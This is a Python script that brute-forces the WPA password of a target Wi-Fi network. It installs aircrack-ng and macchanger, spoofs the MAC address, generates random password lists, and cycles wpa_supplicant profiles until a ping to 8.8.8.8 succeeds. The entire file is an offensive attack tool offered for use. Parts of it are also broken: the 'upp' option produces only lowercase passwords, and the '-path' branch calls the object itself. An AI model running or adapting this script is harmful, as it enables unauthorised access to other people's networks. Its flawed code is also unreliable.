import subprocess,sys,platform,pathlib,itertools,string,random,datetime,argparse

class List_Attack:

      def __init__(self,iface,ssid):

          self.iface_name,self.essid = iface,ssid
          self.password_path = "Password_List"
          self.profile_path = "/etc/wpa_supplicant/"
          self.new_path,self.file_config = "WIFI_HACK",f"{self.essid}_hack_profile.conf"
          self.cycle = itertools.cycle(r"/-\|")
          self.lowercase,self.uppercase,self.digits,self.punctuation = string.ascii_lowercase,string.ascii_uppercase,string.digits,string.punctuation
          self.date_time = datetime.datetime.now()
     
      def tools_install(self):

          ping_tester = subprocess.call(["ping","-c 3","8.8.8.8"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
          if ping_tester == 0:
             #[!] need_rootuser
             update_apt = subprocess.call(["apt","update","-y"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
             install_macchanger = subprocess.call(["apt","install","-y","macchanger"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
             install_aircrack_ng = subprocess.call(["apt","install","-y","aircrack-ng"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
       
          else:
             sys.stdout.write("\n[!] No Connection Network... Sorry,Install macchanger / aircrack-ng \n")
             sys.exit()

      def tools_show_check(self):

          macchanger_check = subprocess.call(["apt","show","macchanger"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
          aircrack_ng_check = subprocess.call(["apt","show","aircrack-ng"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

          if f"{macchanger_check}-{aircrack_ng_check}" == "0-0": 
             return True
          else:
             return False

      def password_list_build(self,type_word,pwd_li,pwd_word_li,passlist=[]):

          lower,upper,pun = f"{self.lowercase}{self.digits}",f"{self.lowercase}{self.digits}",f"{self.lowercase}{self.uppercase}{self.digits}{self.punctuation}"
           
          for _ in range(pwd_li):
             if type_word == "low":
                 passlist.append("".join([random.choice(lower) for _ in range(pwd_word_li)]))
             elif type_word == "upp":
                 passlist.append("".join([random.choice(upper) for _ in range(pwd_word_li)]))
             else:
                 passlist.append("".join([random.choice(pun) for _ in range(pwd_word_li)]))
          pathlib.Path(self.password_path).mkdir(exist_ok=True)
          file_path = f"{self.password_path}/{self.date_time.month}_{self.date_time.day}_{self.date_time.hour}{self.date_time.minute}_pass.txt"
          with open(file_path,"w+",encoding="utf-8")as pass_file:
               [pass_file.write(f"{password}\n") for password in passlist]
          return file_path

      def wifi_hacking(self,pwd_path):

          pathlib.Path(f"{self.profile_path}/{self.new_path}").mkdir(exist_ok=True)
          file_config = f"{self.profile_path}/{self.new_path}/{self.file_config}"
          kill_interface_setting = subprocess.call(["airmon-ng","check","kill"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
          macchanger_iface = subprocess.call(["macchanger","-r",f"{self.iface_name}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
          ifconfig_setup = subprocess.call(["ifconfig",f"{self.iface_name}","up"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
          for password in open(pwd_path,"r",encoding="utf-8").readlines():
    
              sys.stdout.write("\r")
              sys.stdout.write(f"Target_SSID [{self.essid}] / Password >>> {password} ~ {next(self.cycle)}")
              sys.stdout.flush()

              with open(file_config,"w+",encoding="utf-8")as file_profile:
                   file_profile.write('ctrl_interface=/run/wpa_supplicant\nupdate_config=1\nnetwork={\n\n' + f'ssid="{self.essid}"\npsk="{password}"\n' + '}')
              kill_interface = subprocess.call(["airmon-ng",f"{self.iface_name}","up"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              wpa_supplicant_setup = subprocess.call(["wpa_supplicant","-B",f"-i {self.iface_name}",f"-c {file_config}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

              dhcp_setup = subprocess.call(["dhclient"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              ping_tester = subprocess.call(["ping","-c 3","8.8.8.8"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              if ping_tester == 0:
                 sys.stdout.write(f"\n[%] Password / {password} | Profile_Path {file_config}\n")
                 sys.exit()


def main():
    if platform.system() != "Linux":
       sys.stdout.write(f"\n[!] Platform_System Can't Runtime {platform.system()}\n")
       sys.exit()

    try:
        arg = argparse.ArgumentParser()

        arg.add_argument("-iface",type=str,help="Interface_Name / -iface < interface_name >")
        arg.add_argument("-ssid",type=str,help="Target_SSID / -ssid < target_ssid >")
        arg.add_argument("-path",type=str,required=False,help="List_Path / -path < list_path >")
        arg.add_argument("-pwd",type=str,help="Password_Type / -pwd < password_type > [low,upp,pun]")
        arg.add_argument("-pwd_li",type=int,help="Password_Line / -pwd_li < password_line >")
        arg.add_argument("-pwd_word_li",type=int,default=13,help="Password_Word_Line / -pwd_word_li < password_word_line >")
        
        parse = arg.parse_args()

        list_attack = List_Attack(parse.iface,parse.ssid)

        if list_attack.tools_show_check() == False:
           list_attack.tools_install()

        if parse.path != None:
           list_attack(parse.path)

        list_attack.wifi_hacking(list_attack.password_list_build(parse.pwd,parse.pwd_li,parse.pwd_word_li))
           
    except TypeError:
           sys.stdout.write(f"[%] Runtime root@user:python3 wifi_list_attack.py -h\n")
           sys.exit()
    except KeyboardInterrupt:
           sys.stdout.write("\n[%] Stop_Process...\n")
           sys.exit()

if __name__ == "__main__":

  main()
